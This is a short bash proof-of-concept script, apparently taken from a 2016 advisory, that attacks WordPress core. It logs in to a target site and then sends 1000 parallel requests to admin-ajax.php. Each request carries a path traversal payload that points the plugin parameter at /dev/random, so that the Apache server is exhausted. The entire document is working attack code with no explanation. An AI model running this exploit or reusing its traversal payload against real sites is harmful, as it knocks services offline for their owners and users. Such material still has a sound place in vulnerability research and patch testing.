#!/bin/bash
target="http://wpdistillery.vm"
username="bobalobaloo"
password="password"
cookiejar=$(mktemp)
   
# login
curl --cookie-jar "$cookiejar" \
   --data "log=$username&pwd=$password&wp-submit=Log+In&redirect_to=%2f&testcookie=1" \
   "$target/wp-login.php" \
   >/dev/null 2>&1
   
# exhaust apache
for i in `seq 1 1000`
   do
      curl --cookie "$cookiejar" \
      --data "plugin=../../../../../../../../../../dev/random&action=update-plugin" \
      "$target/wp-admin/admin-ajax.php" \
      >/dev/null 2>&1 &
done
   
rm "$cookiejar"

# Source: <https://sumofpwn.nl/advisory/2016/path_traversal_vulnerability_in_wordpress_core_ajax_handlers.html>
